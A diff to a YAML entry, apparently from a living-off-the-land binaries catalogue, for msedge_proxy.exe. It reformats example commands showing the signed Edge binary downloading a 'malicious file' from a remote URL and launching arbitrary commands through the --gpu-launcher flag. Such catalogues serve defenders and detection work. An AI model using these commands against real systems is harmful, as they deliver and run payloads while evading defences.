@@ -43,7 +43,13 @@ resource_profile:
 allowed-tools:
 - msedge-proxy
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- remote
 execution:
   template: msedge-proxy
   sandbox: execFile
@@ -51,10 +57,13 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: msedge_proxy will download malicious file. (Download file from the internet)
+- description: msedge_proxy will download malicious file. (Download file from the
+    internet)
   command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
-- description: msedge_proxy.exe will execute file in the background (Executes a process under a trusted Microsoft signed binary)
-  command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
+- description: msedge_proxy.exe will execute file in the background (Executes a process
+    under a trusted Microsoft signed binary)
+  command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox
+    --gpu-launcher="{CMD} &&"
 references: []
 techniques:
 - exfiltration
@@ -72,7 +81,6 @@ install:
   commands:
   - choco install msedge-proxy
 ---
-
 
 # msedge-proxy
 
